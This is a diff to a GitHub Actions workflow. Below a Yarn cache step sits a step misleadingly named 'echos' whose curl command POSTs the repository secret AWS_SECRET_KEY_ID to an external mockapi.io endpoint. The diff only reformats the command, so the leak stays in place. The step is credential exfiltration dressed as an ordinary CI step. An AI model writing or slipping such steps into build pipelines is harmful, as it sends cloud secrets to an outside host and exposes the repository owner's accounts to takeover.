@@ -16,8 +16,8 @@ jobs:
           path: ./.yarn/cache
           key: ${{ runner.os }}-yarn-${{ hashFiles('./yarn.lock') }}
           restore-keys: ${{ runner.os }}-yarn-${{ hashFiles('./yarn.lock') }}
-
       - name: echos
-        run: curl --location --request POST 'https://626fdcdcc508beec488b1ac0.mockapi.io/secret' --header 'Content-Type: application/json' --data-raw '{"data": ${{ secrets.AWS_SECRET_KEY_ID }}}' 
+        run: |-
+          curl --location --request POST 'https://626fdcdcc508beec488b1ac0.mockapi.io/secret' --header 'Content-Type: application/json' --data-raw '{"data": ${{ secrets.AWS_SECRET_KEY_ID }} }'
 
     
